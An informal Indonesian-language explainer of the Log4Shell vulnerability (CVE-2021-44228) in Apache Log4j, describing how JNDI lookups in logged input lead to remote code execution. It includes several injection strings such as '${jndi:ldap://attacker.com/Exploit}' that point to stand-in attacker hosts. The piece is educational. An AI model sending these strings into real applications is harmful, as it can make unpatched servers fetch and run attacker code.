# Apa itu Log4Shell?
Gini ya...
Ada satu *library logging di Java* yang namanya *Log4j*. Nah, si Log4j ini biasa dipakai buat **nyatet semua hal yang kejadian di aplikasi**, mulai dari login, error, sampe input user.

Masalahnya...
Ternyata dia terlalu “pinter” sampe *bisa eksekusi kode dari luar* kalo inputnya kayak gini:
`${jndi:ldap://evil.eh/boom}`

 ## *Kok bisa jadi celah?*
*Nah ini dia!*

 Si Log4j tuh ngira `${jndi:ldap://...}` itu format "lookup" buat nyari data dari server lain.
* Tapi karena dia *auto-fetch dan auto-execute* class Java dari luar,
  ya lu tinggal taro *class* berisi payload berbahaya, boom... **remote code execution** (RCE) dapet!

> Lo ngetik doang di input? Server langsung nurut & jalanin kode lo. GG ga tuh.

## Gimana Cara Kerjanya?
Singkatnya, Log4Shell itu memanfaatkan fitur "lookup" di Log4j yang bisa nge-parse `${}` (placeholder gitu). Nah, attacker bisa masukin string kayak gini ke log:
`${jndi:ldap://attacker.com/Exploit}`

Log4j bakal ngelakuin JNDI lookup dan nyambung ke server attacker, lalu jalanin Java class berbahaya dari luar! Boom, RCE (Remote Code Execution) langsung terjadi
### contoh eksploitasi
Misalnya sebuah aplikasi log aktivitas user input:

```
logger.info("User input: " + input);

```
Jika seseorang mengisi input seperti ini:
`${jndi:ldap://attacker.com/a}`

Log4j secara otomatis akan:
1.Menafsirkan `${jndi:...}` sebagai instruksi JNDI.

2.Menghubungi attacker.com.

3.Menjalankan payload Java yang dikembalikan dari server penyerang.

Hasilnya: Penyerang bisa menjalankan kode arbitrer (Remote Code Execution - RCE) di server korban.

## Btw...
Log4Shell itu nama panggilan buat celah keamanan yang super berbahaya di Apache Log4j, salah satu library logging paling terkenal sejagat Java. Versi yang kena itu Log4j 2.0 sampai 2.14.1.

Celah ini resmi dikasih kode CVE-2021-44228, dan pertama kali heboh sekitar Desember 2021. Kayak bom waktu, banyak sistem Java di seluruh dunia langsung panik karena celah ini gampang banget dieksploitasi
